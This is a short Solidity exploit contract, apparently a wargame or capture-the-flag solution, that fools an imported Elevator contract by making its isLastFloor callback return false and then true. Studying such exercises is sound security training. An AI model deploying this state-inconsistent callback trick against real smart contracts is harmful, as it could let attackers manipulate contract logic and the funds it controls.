// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/Script.sol";

import {Elevator} from "./Elevator.sol";

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract ElevatorExploit is Building {
    Elevator elevator;
    bool public isCalledOnce = false;

    constructor(address _elevator) {
        console.log("Caller: ", msg.sender);
        elevator = Elevator(_elevator);
    }

    function attack() external {
        console.log("attack Caller: ", msg.sender);
        elevator.goTo(10);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (isCalledOnce) {
            return true;
        } else {
            isCalledOnce = true;
            return false;
        }
    }
}
